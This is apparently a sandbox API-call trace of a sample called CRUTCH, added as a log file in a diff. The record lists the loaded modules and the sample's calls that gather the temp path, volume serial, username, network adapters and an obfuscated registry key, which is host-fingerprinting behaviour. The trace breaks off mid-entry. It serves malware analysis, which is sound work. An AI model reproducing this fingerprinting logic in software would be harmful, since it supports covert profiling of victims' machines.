@@ -1,0 +1,2584 @@
+
+\users\user\desktop\crutch\crutch.dll loaded in process pid = 0xa5c
+
+********** Dumping PEB32 **********
+
+	Path : C:\Users\user\Desktop\CRUTCH\crutch_loader32.exe
+	Base : 0xc60000
+	Size : 0xd2000
+
+	Path : C:\Windows\SYSTEM32\ntdll.dll
+	Base : 0x771a0000
+	Size : 0x16e000
+
+	Path : C:\Windows\SYSTEM32\KERNEL32.DLL
+	Base : 0x76150000
+	Size : 0x140000
+
+	Path : C:\Windows\SYSTEM32\KERNELBASE.dll
+	Base : 0x76070000
+	Size : 0xd7000
+
+	Path : C:\Windows\SYSTEM32\USER32.dll
+	Base : 0x75ec0000
+	Size : 0x153000
+
+	Path : C:\Windows\SYSTEM32\GDI32.dll
+	Base : 0x76b70000
+	Size : 0x10e000
+
+	Path : C:\Windows\system32\IMM32.DLL
+	Base : 0x76da0000
+	Size : 0x27000
+
+	Path : C:\Windows\SYSTEM32\MSCTF.dll
+	Base : 0x76880000
+	Size : 0x113000
+
+	Path : C:\Windows\SYSTEM32\msvcrt.dll
+	Base : 0x767a0000
+	Size : 0xc3000
+
+	Path : C:\Users\user\Desktop\CRUTCH\crutch.dll
+	Base : 0x748a0000
+	Size : 0x83000
+
+	Path : C:\Windows\SYSTEM32\DNSAPI.dll
+	Base : 0x74820000
+	Size : 0x7e000
+
+	Path : C:\Windows\SYSTEM32\IPHLPAPI.DLL
+	Base : 0x74800000
+	Size : 0x20000
+
+	Path : C:\Windows\SYSTEM32\ADVAPI32.dll
+	Base : 0x76290000
+	Size : 0x7c000
+
+	Path : C:\Windows\SYSTEM32\WS2_32.dll
+	Base : 0x76020000
+	Size : 0x50000
+
+	Path : C:\Windows\SYSTEM32\WINHTTP.dll
+	Base : 0x74760000
+	Size : 0x9f000
+
+	Path : C:\Windows\SYSTEM32\CRYPT32.dll
+	Base : 0x764e0000
+	Size : 0x188000
+
+	Path : C:\Windows\SYSTEM32\WLDAP32.dll
+	Base : 0x76af0000
+	Size : 0x54000
+
+	Path : C:\Windows\SYSTEM32\WININET.dll
+	Base : 0x74580000
+	Size : 0x1d6000
+
+	Path : C:\Windows\SYSTEM32\NSI.dll
+	Base : 0x769a0000
+	Size : 0x7000
+
+	Path : C:\Windows\SYSTEM32\WINNSI.DLL
+	Base : 0x74570000
+	Size : 0x8000
+
+	Path : C:\Windows\SYSTEM32\sechost.dll
+	Base : 0x75c70000
+	Size : 0x41000
+
+	Path : C:\Windows\SYSTEM32\RPCRT4.dll
+	Base : 0x76ce0000
+	Size : 0xba000
+
+	Path : C:\Windows\SYSTEM32\combase.dll
+	Base : 0x76310000
+	Size : 0x17d000
+
+	Path : C:\Windows\SYSTEM32\MSASN1.dll
+	Base : 0x76c80000
+	Size : 0xe000
+
+	Path : C:\Windows\SYSTEM32\iertutil.dll
+	Base : 0x74330000
+	Size : 0x232000
+
+	Path : C:\Windows\SYSTEM32\USERENV.dll
+	Base : 0x74310000
+	Size : 0x1b000
+
+	Path : C:\Windows\SYSTEM32\SspiCli.dll
+	Base : 0x749a0000
+	Size : 0x1e000
+
+	Path : C:\Windows\SYSTEM32\profapi.dll
+	Base : 0x74300000
+	Size : 0xf000
+
+	Path : C:\Windows\SYSTEM32\CRYPTBASE.dll
+	Base : 0x74990000
+	Size : 0xa000
+
+	Path : C:\Windows\SYSTEM32\bcryptPrimitives.dll
+	Base : 0x74930000
+	Size : 0x54000
+
+********** End Dump PEB32 **********
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetModuleHandleW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpModuleName : 0x7490dfdc ("kernel32.dll")
+[RET] 0x748ee9e4
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490dff8 ("FlsAlloc")
+[RET] 0x748ee9f4
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e004 ("FlsFree")
+[RET] 0x748eea07
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e00c ("FlsGetValue")
+[RET] 0x748eea1a
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e018 ("FlsSetValue")
+[RET] 0x748eea2d
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e024 ("InitializeCriticalSectionEx")
+[RET] 0x748eea40
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e040 ("CreateEventExW")
+[RET] 0x748eea53
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e050 ("CreateSemaphoreExW")
+[RET] 0x748eea66
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e064 ("SetThreadStackGuarantee")
+[RET] 0x748eea79
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e07c ("CreateThreadpoolTimer")
+[RET] 0x748eea8c
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e094 ("SetThreadpoolTimer")
+[RET] 0x748eea9f
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e0a8 ("WaitForThreadpoolTimerCallbacks")
+[RET] 0x748eeab2
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e0c8 ("CloseThreadpoolTimer")
+[RET] 0x748eeac5
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e0e0 ("CreateThreadpoolWait")
+[RET] 0x748eead8
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e0f8 ("SetThreadpoolWait")
+[RET] 0x748eeaeb
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e10c ("CloseThreadpoolWait")
+[RET] 0x748eeafe
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e120 ("FlushProcessWriteBuffers")
+[RET] 0x748eeb11
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e13c ("FreeLibraryWhenCallbackReturns")
+[RET] 0x748eeb24
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e15c ("GetCurrentProcessorNumber")
+[RET] 0x748eeb37
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e178 ("GetLogicalProcessorInformation")
+[RET] 0x748eeb4a
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e198 ("CreateSymbolicLinkW")
+[RET] 0x748eeb5d
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e1ac ("SetDefaultDllDirectories")
+[RET] 0x748eeb70
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e1c8 ("EnumSystemLocalesEx")
+[RET] 0x748eeb83
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e1dc ("CompareStringEx")
+[RET] 0x748eeb96
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e1ec ("GetDateFormatEx")
+[RET] 0x748eeba9
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e1fc ("GetLocaleInfoEx")
+[RET] 0x748eebbc
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e20c ("GetTimeFormatEx")
+[RET] 0x748eebcf
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e21c ("GetUserDefaultLocaleName")
+[RET] 0x748eebe2
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e238 ("IsValidLocaleName")
+[RET] 0x748eebf5
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e24c ("LCMapStringEx")
+[RET] 0x748eec08
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e25c ("GetCurrentPackageId")
+[RET] 0x748eec1b
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e270 ("GetTickCount64")
+[RET] 0x748eec2e
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e280 ("GetFileInformationByHandleExW")
+[RET] 0x748eec41
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x7490e2a0 ("SetFileInformationByHandleW")
+[RET] 0x748eec54
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetCurrentThreadId> in [KERNEL32.DLL] 
+[RET] 0x748f0317
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetCommandLineA> in [KERNEL32.DLL] 
+[RET] 0x748e8f2c
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetEnvironmentStringsW> in [KERNEL32.DLL] 
+[RET] 0x748f2d70
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x0 (CP_ACP)
+[PAR] DWORD   dwFlags           : 0x0 
+[PAR] LPCWSTR lpWideCharStr     : 0x10b0438
+[STR]         -> "ALLUSERSPROFILE=C:\ProgramData"
+[PAR] int     cchWideChar       : 0x4ef
+[PAR] LPSTR   lpMultiByteStr    : 0x0
+[PAR] int     cbMultiByte       : 0x0
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x0
+[RET] 0x748f2da4
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x0 (CP_ACP)
+[PAR] DWORD   dwFlags           : 0x0 
+[PAR] LPCWSTR lpWideCharStr     : 0x10b0438
+[STR]         -> "ALLUSERSPROFILE=C:\ProgramData"
+[PAR] int     cchWideChar       : 0x4ef
+[PAR] LPSTR   lpMultiByteStr    : 0x10b0e20
+[PAR] int     cbMultiByte       : 0x4ef
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x0
+[RET] 0x748f2dca
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <FreeEnvironmentStringsW> in [KERNEL32.DLL] 
+[PAR] LPWCH penv : 0x10b0438
+[STR]       -> "ALLUSERSPROFILE=C:\ProgramData"
+[RET] 0x748f2dde
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetStartupInfoW> in [KERNEL32.DLL] 
+[PAR] LPSTARTUPINFOW lpStartupInfo : 0xfef780
+[RET] 0x748f15fb
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetACP> in [KERNEL32.DLL] 
+[RET] 0x748ef9b8
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <IsValidCodePage> in [KERNEL32.DLL] 
+[RET] 0x748efe97
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetCPInfo> in [KERNEL32.DLL] 
+[RET] 0x748efeaa
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetCPInfo> in [KERNEL32.DLL] 
+[RET] 0x748efa68
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x4e4 (windows-1252)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0xfef660
+[PAR] int    cbMultiByte    : 0x100
+[PAR] LPWSTR lpWideCharStr  : 0x0
+[PAR] int    cchWideChar    : 0x0
+[RET] 0x748f94e5
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x4e4 (windows-1252)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0xfef660
+[PAR] int    cbMultiByte    : 0x100
+[PAR] LPWSTR lpWideCharStr  : 0xfeefc8
+[PAR] int    cchWideChar    : 0x100
+[RET] 0x748f9566
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetStringTypeW> in [KERNEL32.DLL] 
+[RET] 0x748f9578
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x4e4 (windows-1252)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0xfef660
+[PAR] int    cbMultiByte    : 0x100
+[PAR] LPWSTR lpWideCharStr  : 0x0
+[PAR] int    cchWideChar    : 0x0
+[RET] 0x748f5d88
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x4e4 (windows-1252)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0xfef660
+[PAR] int    cbMultiByte    : 0x100
+[PAR] LPWSTR lpWideCharStr  : 0xfeef98
+[PAR] int    cchWideChar    : 0x100
+[RET] 0x748f5e08
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <LCMapStringEx> in [KERNEL32.DLL] 
+[RET] 0x748f8b69
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <LCMapStringEx> in [KERNEL32.DLL] 
+[RET] 0x748f8b69
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x1252 (windows-1252)
+[PAR] DWORD   dwFlags           : 0x0 
+[PAR] LPCWSTR lpWideCharStr     : 0xfeed88
+[PAR] int     cchWideChar       : 0x100
+[PAR] LPSTR   lpMultiByteStr    : 0xfef560
+[PAR] int     cbMultiByte       : 0x100
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x0
+[RET] 0x748f5ef7
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x4e4 (windows-1252)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0xfef660
+[PAR] int    cbMultiByte    : 0x100
+[PAR] LPWSTR lpWideCharStr  : 0x0
+[PAR] int    cchWideChar    : 0x0
+[RET] 0x748f5d88
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x4e4 (windows-1252)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0xfef660
+[PAR] int    cbMultiByte    : 0x100
+[PAR] LPWSTR lpWideCharStr  : 0xfeefb8
+[PAR] int    cchWideChar    : 0x100
+[RET] 0x748f5e08
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <LCMapStringEx> in [KERNEL32.DLL] 
+[RET] 0x748f8b69
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <LCMapStringEx> in [KERNEL32.DLL] 
+[RET] 0x748f8b69
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x1252 (windows-1252)
+[PAR] DWORD   dwFlags           : 0x0 
+[PAR] LPCWSTR lpWideCharStr     : 0xfeeda8
+[PAR] int     cchWideChar       : 0x100
+[PAR] LPSTR   lpMultiByteStr    : 0xfef460
+[PAR] int     cbMultiByte       : 0x100
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x0
+[RET] 0x748f5ef7
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetModuleFileNameA> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : NULL. (Try to get current .exe's path)
+[PAR] LPSTR   lpFilename : 0x74919fb8
+[PAR] DWORD   nSize      : 0x104
+[RET] 0x748f29e9
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <IsProcessorFeaturePresent> in [KERNEL32.DLL] 
+[PAR] DWORD ProcessorFeature : 0xa (PF_XMMI64_INSTRUCTIONS_AVAILABLE)
+[RET] 0x748ee3ca
+
+[ * ] [pid 0xa5c][tid 0xab8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <CreateThread> in [KERNEL32.DLL] 
+[PAR] LPTHREAD_START_ROUTINE lpStartAddress  : 0x748e3298 
+[PAR] LPVOID                 lpParameter     : 0x0
+[PAR] DWORD                  dwCreationFlags : 0x0
+[RET] 0x748e34b5
+
+Thread created by monitored process : Now monitoring [pid 0xa5c][tid 0xa9c]
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetCurrentThreadId> in [KERNEL32.DLL] 
+[RET] 0x748e9033
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <CreateMutexW> in [KERNEL32.DLL] 
+[PAR] LPSECURITY_ATTRIBUTES lpMutexAttributes : 0x0
+[PAR] BOOL                  bInitialOwner     : 0x0
+[PAR] LPCWSTR               lpName            : 0x0 (null)
+[RET] 0x748e2b1f
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <ExpandEnvironmentStringsA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR lpSrc : 0x2a6f88c
+[STR]         -> "%TEMP%"
+[PAR] LPTSTR  lpDst : 0x0
+[PAR] DWORD   nSize : 0x0
+[RET] 0x748e3c87
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <ExpandEnvironmentStringsA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR lpSrc : 0x2a6f88c
+[STR]         -> "%TEMP%"
+[PAR] LPTSTR  lpDst : 0x10b3a40
+[PAR] DWORD   nSize : 0x22
+[RET] 0x748e3cbb
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <SetErrorMode> in [KERNEL32.DLL] 
+[RET] 0x748e3710
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetVolumeInformationW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpRootPathName           : NULL (current directory)
+[PAR] LPWSTR  lpVolumeNameBuffer       : 0x0
+[PAR] DWORD   nVolumeNameSize          : 0x0
+[PAR] LPDWORD lpVolumeSerialNumber     : 0x2a6f614
+[PAR] LPDWORD lpMaximumComponentLength : 0x2a6f608
+[PAR] LPDWORD lpFileSystemFlags        : 0x2a6f60c
+[PAR] LPWSTR  lpFileSystemNameBuffer   : 0x0
+[PAR] DWORD   nFileSystemNameSize      : 0x0
+[RET] 0x748e3753
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <RegOpenKeyExA> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey       : 0x80000002 (HKEY_LOCAL_MACHINE)
+[PAR] LPCTSTR lpSubKey   : 0x10b3860
+[STR]         -> "Ü/1ÏÕ @i‚*8ü]¸×›Õ™ïªÅ¥Uýt‘ê{	vi"
+[PAR] DWORD   ulOptions  : 0x0
+[PAR] REGSAM  samDesired : 0x20119 (KEY_READ | KEY_EXECUTE | KEY_WOW64_64KEY | KEY_WOW64_RES)
+[PAR] PHKEY   phkResult  : 0x2a6f61c
+[RET] 0x748e37e9
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <ExpandEnvironmentStringsA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR lpSrc : 0x2a6f5e4
+[STR]         -> "%USERNAME%"
+[PAR] LPTSTR  lpDst : 0x0
+[PAR] DWORD   nSize : 0x0
+[RET] 0x748e3c87
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <ExpandEnvironmentStringsA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR lpSrc : 0x2a6f5e4
+[STR]         -> "%USERNAME%"
+[PAR] LPTSTR  lpDst : 0x10ae3f8
+[PAR] DWORD   nSize : 0x6
+[RET] 0x748e3cbb
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <RegCloseKey> in [ADVAPI32.dll] 
+[RET] 0x748e38f5
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetAdaptersInfo> in [IPHLPAPI.DLL] 
+[PAR] PIP_ADAPTER_INFO AdapterInfo : 0x2a6cd70
+[PAR] PULONG           SizePointer : 0x2a6cd6c
+[RET] 0x748e364b
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <SetErrorMode> in [KERNEL32.DLL] 
+[RET] 0x748e3710
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetVolumeInformationW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpRootPathName           : NULL (current directory)
+[PAR] LPWSTR  lpVolumeNameBuffer       : 0x0
+[PAR] DWORD   nVolumeNameSize          : 0x0
+[PAR] LPDWORD lpVolumeSerialNumber     : 0x2a6f614
+[PAR] LPDWORD lpMaximumComponentLength : 0x2a6f608
+[PAR] LPDWORD lpFileSystemFlags        : 0x2a6f60c
